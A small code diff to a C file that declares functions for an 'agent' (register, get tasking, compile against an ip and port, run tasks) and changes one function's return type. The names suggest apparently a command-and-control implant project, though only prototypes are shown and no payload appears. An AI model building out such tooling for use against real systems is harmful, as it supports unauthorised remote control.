@@ -22,7 +22,7 @@
 #define COMPILE "gcc -lssh -lcurl -o out/client.out out/client.c out/agent.c out/b64.c"
 
 void agent_init(char *agent_id);
-int agent_get_tasking(char *agent_id, char *tasking);
+char *agent_get_tasking(char *agent_id);
 void agent_compile(char *ip, char *port);
 void agent_register(char *id, char *port);
 void agent_task(int operation, char *agent, char *opt);
